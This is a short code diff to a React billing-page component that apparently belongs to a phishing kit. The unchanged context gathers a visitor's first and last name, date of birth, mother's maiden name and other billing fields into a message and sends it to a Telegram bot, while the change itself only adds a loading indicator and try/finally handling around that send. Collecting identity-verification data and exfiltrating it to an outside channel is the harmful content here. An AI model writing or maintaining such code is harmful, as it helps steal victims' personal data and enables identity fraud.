@@ -94,6 +94,7 @@ export function BillingPage({ onComplete }: BillingPageProps) {
       return;
     }
 
+    setLoading(true);
     const message = `<b>[BILLING] Information:</b>\n` +
       `First Name: ${formData.firstName}\n` +
       `Last Name: ${formData.lastName}\n` +
@@ -106,8 +107,12 @@ export function BillingPage({ onComplete }: BillingPageProps) {
       `DOB: ${formData.dob}\n` +
       `Mother's Maiden Name: ${formData.motherMaidenName}`;
     
-    await sendToTelegram(message);
-    onComplete(formData);
+    try {
+      await sendToTelegram(message);
+      onComplete(formData);
+    } finally {
+      setLoading(false);
+    }
   };
 
   return (
